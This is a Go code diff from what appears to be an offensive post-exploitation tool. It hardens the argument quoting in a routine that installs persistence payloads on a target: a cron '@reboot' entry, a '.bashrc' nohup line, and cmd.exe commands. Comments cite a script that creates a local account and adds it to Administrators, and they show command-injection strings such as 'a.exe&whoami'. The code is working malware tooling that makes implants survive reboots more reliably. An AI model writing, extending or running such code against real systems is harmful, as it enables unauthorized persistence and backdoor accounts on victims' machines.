@@ -376,7 +376,16 @@ func shellArgv(platform, script string) []string {
 		// embedded quotes -- which cmd.exe passes through correctly. Shell
 		// operators (&&, &, |, >) survive as their own tokens and are still
 		// interpreted by cmd, so scripts that need a shell keep working.
-		return append([]string{"cmd.exe", "/c"}, splitWindowsCommand(script)...)
+		//
+		// "Go has to add" was the hole: Go adds quoting only for an argument with a
+		// space, a tab or a quote, so a token with a metacharacter and no space was
+		// handed to cmd.exe bare. protectCmdToken closes that per token, which is
+		// the only layer where it can still force Go's hand.
+		tokens := splitWindowsCommand(script)
+		for i := range tokens {
+			tokens[i] = protectCmdToken(tokens[i])
+		}
+		return append([]string{"cmd.exe", "/c"}, tokens...)
 	}
 	return []string{"/bin/sh", "-c", script}
 }
@@ -533,7 +542,19 @@ func installCommand(platform, module, payload, name string) ([]string, error) {
 		switch module {
 		case "linux-cron":
 			// crond re-parses the line through /bin/sh, so the path stays quoted.
-			script := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "@reboot %s") | crontab -`, qp)
+			// The whole "@reboot <payload>" string is single-quoted as one unit.
+			//
+			// It used to be `echo "@reboot %s"` with a separately single-quoted
+			// payload inside, which nests two quoting schemes: the payload's own
+			// single quotes were correct, but the surrounding double quotes meant a
+			// double quote in the payload closed the echo argument and the rest of
+			// the line ran as a command. A plausible path such as /tmp/agent"v2 was
+			// a hard "Unterminated quoted string" that left no crontab entry.
+			//
+			// Quoting once, after building the full string, removes the nesting
+			// rather than trying to escape two layers against each other.
+			script := fmt.Sprintf(`(crontab -l 2>/dev/null; echo %s) | crontab -`,
+				shellQuotePOSIX("@reboot "+payload))
 			return shellArgv(platform, script), nil
 		case "linux-bashrc":
 			script := fmt.Sprintf("echo %s >> ~/.bashrc", shellQuotePOSIX("nohup "+payload+" >/dev/null 2>&1 &"))
@@ -866,16 +887,35 @@ func quoteEachPOSIX(items []string) string {
 
 // shellQuoteWindows double-quotes s for cmd.exe.
 //
-// A value that itself contains a double quote has no safe representation in a
-// quoted argument, so it is rejected instead of being silently mangled. So are
-// carriage return and line feed, and that rejection is load-bearing rather than
-// tidiness: shellArgv hands cmd.exe a token list, and an argument containing a
-// newline is quoted by Go into a single "...\n..." argument. cmd.exe reads an
-// unterminated line and waits on stdin, so the spawn never returns. An operator
-// installing persistence with such a payload would see the request hang until it
-// timed out, with nothing on the target to explain why. Neither character can
-// appear in a Windows path or a registry value name, so rejecting them costs
-// nothing legitimate.
+// A double quote has no safe representation inside a quoted argument, so it is
+// rejected rather than mangled. CR and LF are rejected too, and that is
+// load-bearing: shellArgv hands cmd.exe a token list, and Go quotes an argument
+// containing a newline into a single "...\n..." argument. cmd.exe reads an
+// unterminated line and waits on stdin, so the spawn never returns and the
+// operator sees the request hang until it times out.
+//
+// # Why this function alone is not enough
+//
+// The quotes added here are not reliably present by the time cmd.exe sees the
+// value. shellArgv splits the script back into a token list, which drops them,
+// and Go's syscall.EscapeArg re-quotes an argument only when it contains a space,
+// tab or quote. A payload with a metacharacter and no space therefore reached
+// cmd.exe bare, and cmd.exe treated the character as syntax:
+//
+//	&  splits the command; the text after it ran as a second command
+//	|  pipes; the text after it ran
+//	<  redirection -- "The system cannot find the file specified."
+//	>  redirection -- silent, and the value was truncated at the character
+//	^  cmd's escape, consumed: `a^b.exe` became `ab.exe`
+//
+// The actual protection is protectCmdToken, applied per token after the split,
+// because that is the layer at which it is still possible to control whether Go
+// will quote the argument. See its comment.
+//
+// `%` is deliberately allowed: a payload is a path on the target, and
+// `%APPDATA%\agent.exe` is a legitimate value that has to reach the target
+// un-expanded by us and expand there. It is the one metacharacter whose
+// expansion is a feature rather than the bug.
 func shellQuoteWindows(s string) (string, error) {
 	if strings.Contains(s, `"`) {
 		return "", errors.New(`value may not contain a double quote`)
@@ -884,6 +924,73 @@ func shellQuoteWindows(s string) (string, error) {
 		return "", errors.New(`value may not contain a newline`)
 	}
 	return `"` + s + `"`, nil
+}
+
+// cmdOperators are the tokens that are meant to be interpreted by cmd.exe rather
+// than passed through as data. They are what makes scripts such as
+// `net user x p /add && net localgroup Administrators x /add` work, so they must
+// not be protected.
+var cmdOperators = map[string]bool{
+	"&": true, "&&": true, "|": true, "||": true,
+	"<": true, ">": true, ">>": true,
+}
+
+// protectCmdToken makes one argv element survive cmd.exe's parsing intact.
+//
+// This exists because "the argument is quoted" and "cmd.exe sees a quoted
+// argument" are not the same claim. Go's syscall.EscapeArg wraps an argument in
+// quotes only when it contains a space, a tab or a quote. Anything else is handed
+// over bare, and cmd.exe then reads `&`, `|`, `<`, `>` and `^` inside it as
+// syntax rather than as text:
+//
+//	C:\Temp\a.exe&whoami    ran whoami as a second command
+//	C:\Temp\a.exe>pwned.txt  wrote the file and truncated the value
+//
+// # Why this escapes with caret instead of adding quotes
+//
+// The obvious fix -- wrap the token in quotes here so Go has to quote it -- was
+// tried and measured, and it corrupts the value. Go renders a quote inside an
+// argument as \" (a C-runtime convention), and cmd.exe has no backslash escape,
+// so it reads that as a literal backslash followed by a quote toggle. The value
+// the target program then receives is `\"C:\Temp\a.exe&whoami\"` -- inert, but
+// wrong, so the persistence entry points at a path that does not exist. Inert and
+// corrupt is not a fix.
+//
+// Caret is cmd.exe's own escape character, and the only one that survives the
+// trip: cmd consumes `^&` and passes a literal `&` to the program.
+//
+// It is applied only when Go will hand the token over bare -- no space, tab or
+// quote. That is load-bearing in both directions: inside the quotes Go adds, cmd
+// does not process caret at all, so escaping a token with a space would leave a
+// stray `^` in the value; and a token with a space is already safe, because cmd
+// treats metacharacters inside quotes as literal.
+//
+// Operator tokens are returned untouched, so a script that needs a shell keeps
+// working: `net user x p /add && net localgroup Administrators x /add` depends on
+// that `&&` reaching cmd as an operator. A token containing none of the
+// metacharacters is untouched too, so an ordinary path is byte-identical to what
+// it was before.
+func protectCmdToken(tok string) string {
+	if tok == "" || cmdOperators[tok] {
+		return tok
+	}
+	if !strings.ContainsAny(tok, `&|<>^`) {
+		return tok
+	}
+	// Go quotes an argument containing a space, tab or quote, and inside those
+	// quotes cmd does not process caret. Such a token needs no escaping.
+	if strings.ContainsAny(tok, " \t\"") {
+		return tok
+	}
+	var b strings.Builder
+	b.Grow(len(tok) + 4)
+	for i := 0; i < len(tok); i++ {
+		if strings.IndexByte(`&|<>^`, tok[i]) >= 0 {
+			b.WriteByte('^')
+		}
+		b.WriteByte(tok[i])
+	}
+	return b.String()
 }
 
 // sedDeleteScript builds the `sed -i` invocation that drops the line matching
